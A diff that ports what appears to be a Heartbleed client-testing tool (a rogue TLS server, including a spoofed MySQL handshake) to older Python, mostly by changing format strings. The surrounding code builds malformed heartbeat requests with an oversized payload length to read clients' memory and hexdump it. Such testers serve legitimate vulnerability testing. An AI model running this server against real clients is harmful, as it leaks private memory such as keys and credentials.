@@ -84,14 +84,14 @@ def make_hello(sslver, cipher):
     ee 7e 21 c4 1d 2e 9f e9 60 5f 05 b0 ce af 7e b7
     95 8c 33 42 3f d5 00
     '''
-    data += ' '.join('{:02x}'.format(c) for c in cipher)
+    data += ' '.join('{0:02x}'.format(c) for c in cipher)
     data += ' 00' # No compression
     data += ' 00 05' # Extensions length
     # Heartbeat extension
     data += ' 00 0f' # Heartbeat type
     data += ' 00 01' # Length
     data += ' 01'    # mode
-    return bytearray.fromhex(data.replace('\n', ''))
+    return bytearray.fromhex(unicode(data).replace('\n', ''))
 
 def make_heartbeat(sslver, payload_len=0xffed):
     data = '18 ' + sslver
@@ -103,7 +103,7 @@ def make_heartbeat(sslver, payload_len=0xffed):
     # heartbeat requests. Therefore request a payload that fits exactly in four
     # records (0x4000 * 4 - 3 - 16 = 0xffed).
     data += ' {0:02x} {1:02x}'.format(payload_len >> 8, payload_len & 0xFF)
-    return bytearray.fromhex(data.replace('\n', ''))
+    return bytearray.fromhex(unicode(data).replace('\n', ''))
 
 def hexdump(data):
     allzeroes = b'\0' * 16
@@ -118,8 +118,8 @@ def hexdump(data):
             if zerolines >= 2:
                 continue
 
-        print("{:04x}: {:47}  {}".format(i,
-            ' '.join('{:02x}'.format(c) for c in line),
+        print("{0:04x}: {1:47}  {2}".format(i,
+            ' '.join('{0:02x}'.format(c) for c in line),
             ''.join(chr(c) if c >= 32 and c < 127 else '.' for c in line)))
 
 class Failure(Exception):
@@ -223,7 +223,7 @@ def read_hb_response(sock, timeout):
             break
         else:
             # Cannot tell whether vulnerable or not!
-            raise Failure('Unexpected record type {}'.format(record_type))
+            raise Failure('Unexpected record type {0}'.format(record_type))
 
         timeout = end_time - time.time()
 
@@ -231,7 +231,7 @@ def read_hb_response(sock, timeout):
     if alert:
         lvl, desc = alert[0:1], ord(alert[1:2])
         lvl = 'Warning' if lvl == 1 else 'Fatal'
-        print('Got Alert, level={}, description={}'.format(lvl, desc))
+        print('Got Alert, level={0}, description={1}'.format(lvl, desc))
         if not memory:
             print('Not vulnerable! (Heartbeats disabled or not OpenSSL)')
             return None
@@ -247,7 +247,7 @@ class RequestHandler(socketserver.BaseRequestHandler):
         self.args = self.server.args
         self.sslver = '03 01' # default to TLSv1.0
         remote_addr, remote_port = self.request.getpeername()[:2]
-        print("Connection from: {}:{}".format(remote_addr, remote_port))
+        print("Connection from: {0}:{1}".format(remote_addr, remote_port))
 
         try:
             # Set timeout to prevent hang on clients that send nothing
@@ -305,7 +305,7 @@ class RequestHandler(socketserver.BaseRequestHandler):
         # The first cipher is fine...
         cipher = bytearray(hnd[off:off+2])
 
-        self.sslver = '{:02x} {:02x}'.format(ver >> 8, ver & 0xFF)
+        self.sslver = '{0:02x} {1:02x}'.format(ver >> 8, ver & 0xFF)
 
         # (1) Handshake: ServerHello
         self.request.sendall(make_hello(self.sslver, cipher))
@@ -339,7 +339,7 @@ class RequestHandler(socketserver.BaseRequestHandler):
     def prepare_mysql(self, sock):
         # This was taken from a MariaDB client. For reference, see
         # https://dev.mysql.com/doc/internals/en/connection-phase-packets.html#packet-Protocol::Handshake
-        greeting = '''
+        greeting = u'''
         56 00 00 00 0a 35 2e 35  2e 33 36 2d 4d 61 72 69
         61 44 42 2d 6c 6f 67 00  04 00 00 00 3d 3b 4e 57
         4c 54 44 35 00 ff ff 21  02 00 0f e0 15 00 00 00
@@ -355,7 +355,7 @@ class RequestHandler(socketserver.BaseRequestHandler):
         self.expect(packet_len == 32, 'Expected SSLRequest length == 32')
         self.expect((caps & 0x800), 'Missing Client SSL support')
 
-        print("Skipping {} packet bytes...".format(packet_len))
+        print("Skipping {0} packet bytes...".format(packet_len))
         # Skip remainder (minus 2 for caps) to prepare for SSL handshake
         sock.recv(packet_len - 2)
 
@@ -408,7 +408,7 @@ class RequestHandler(socketserver.BaseRequestHandler):
     def recv_s(self, struct_def, what):
         s = struct.Struct(struct_def)
         data = self.request.recv(s.size)
-        msg = '{}: received only {}/{} bytes'.format(what, len(data), s.size)
+        msg = '{0}: received only {1}/{2} bytes'.format(what, len(data), s.size)
         self.expect(len(data) == s.size, msg)
         return s.unpack(data)
 
@@ -430,7 +430,7 @@ class PacemakerServer(socketserver.TCPServer):
         self.stopped = True
 
 def serve(args):
-    print('Listening on {}:{} for {} clients'
+    print('Listening on {0}:{1} for {2} clients'
         .format(args.listen, args.port, args.client))
     server = PacemakerServer(args)
     server.serve_forever()
